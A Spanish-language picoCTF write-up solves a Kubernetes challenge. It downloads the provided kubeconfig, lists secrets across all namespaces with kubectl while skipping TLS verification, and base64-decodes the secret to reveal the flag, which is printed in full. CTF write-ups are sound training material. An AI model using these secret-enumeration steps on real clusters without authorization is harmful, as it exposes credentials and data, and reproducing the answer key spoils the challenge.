## Descripción

We have a kubernetes cluster setup and flag is in the secrets. You think you can get it? Please wait for a minute for the application to be configured! Kubernetes is running at: green-hill.picoctf.net : 57000 You can find your configuration file [here](http://green-hill.picoctf.net:51889/kubeconfig).

## Solución
```
┌──(flavio㉿kali)-[~/picoCTF/concurso/ksecrets]
└─$ wget http://green-hill.picoctf.net:51889/kubeconfig                                                                                           
--2026-03-18 17:40:00--  http://green-hill.picoctf.net:51889/kubeconfig
Resolviendo green-hill.picoctf.net (green-hill.picoctf.net)... 3.18.205.4
Conectando con green-hill.picoctf.net (green-hill.picoctf.net)[3.18.205.4]:51889... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2941 (2.9K) [application/octet-stream]
Grabando a: «kubeconfig»

kubeconfig                                                 100%[========================================================================================================================================>]   2.87K  --.-KB/s    en 0s      

2026-03-18 17:40:00 (137 MB/s) - «kubeconfig» guardado [2941/2941]

                                                                                                                                                                                                                                            
┌──(flavio㉿kali)-[~/picoCTF/concurso/ksecrets]
└─$ ls
kubeconfig

#Cambiamos el server por https://green-hill.picoctf.net:57000

┌──(flavio㉿kali)-[~/picoCTF/concurso/ksecrets]
└─$ kubectl --kubeconfig=kubeconfig --insecure-skip-tls-verify=true get secrets -A
NAMESPACE     NAME                       TYPE                               DATA   AGE
kube-system   chart-values-traefik       helmcharts.helm.cattle.io/values   1      7m40s
kube-system   chart-values-traefik-crd   helmcharts.helm.cattle.io/values   0      7m40s
kube-system   k3s-serving                kubernetes.io/tls                  2      7m41s
picoctf       ctf-secret                 Opaque                             1      7m37s
                                                                                                                                                                                                                                            
┌──(flavio㉿kali)-[~/picoCTF/concurso/ksecrets]
└─$ kubectl --kubeconfig=kubeconfig --insecure-skip-tls-verify=true -n picoctf get secret ctf-secret -o yaml
apiVersion: v1
data:
  flag: cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfNDAxM2EzNjh9Cg==
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"flag":"cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfNDAxM2EzNjh9Cg=="},"kind":"Secret","metadata":{"annotations":{},"name":"ctf-secret","namespace":"picoctf"},"type":"Opaque"}
  creationTimestamp: "2026-03-18T23:39:12Z"
  name: ctf-secret
  namespace: picoctf
  resourceVersion: "377"
  uid: be046b61-d57e-430c-9c55-a225ede32fa6
type: Opaque
                                                                                                                                                                                                                                            
┌──(flavio㉿kali)-[~/picoCTF/concurso/ksecrets]
└─$ echo "cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfNDAxM2EzNjh9Cg==" | base64 -d
picoCTF{ks3cr375_41n7_s4f3_4013a368}
```

picoCTF{ks3cr375_41n7_s4f3_4013a368}
## Notas adicionales

Hacemos uso de kubectl para la solución de este reto.